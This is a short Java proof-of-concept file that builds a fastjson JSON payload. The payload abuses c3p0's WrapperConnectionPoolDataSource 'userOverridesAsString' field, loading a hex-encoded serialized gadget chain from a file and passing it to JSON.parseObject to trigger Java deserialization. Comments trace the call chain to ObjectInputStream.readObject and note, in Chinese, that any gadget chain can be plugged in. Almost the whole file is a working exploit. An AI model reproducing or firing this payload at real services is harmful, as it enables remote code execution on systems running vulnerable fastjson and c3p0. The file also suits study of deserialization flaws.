import com.alibaba.fastjson.JSON;

import java.io.*;

/*
* WrapperConnectionPoolDataSource.WrapperConnectionPoolDataSource()
*   C3P0ImplUtils.parseUserOverridesAsString()
*       SerializableUtils.fromByteArray()
*           SerializableUtils.deserializeFromByteArray()
*               ObjectInputStream.readObject()
*
* */
/*
* 最后随便找一条链子打就行，这里为了方便直接使用fastjson
* */
public class C3P0_HEX {
    public static void main(String[] args) throws Exception{
        //写一条链子的Hex编码
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader("ser.bin"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
        }
        String HexString = sb.toString();
        String poc ="{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"}," +
                "\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:"+HexString+";\"}}";
        JSON.parseObject(poc);

 }

}
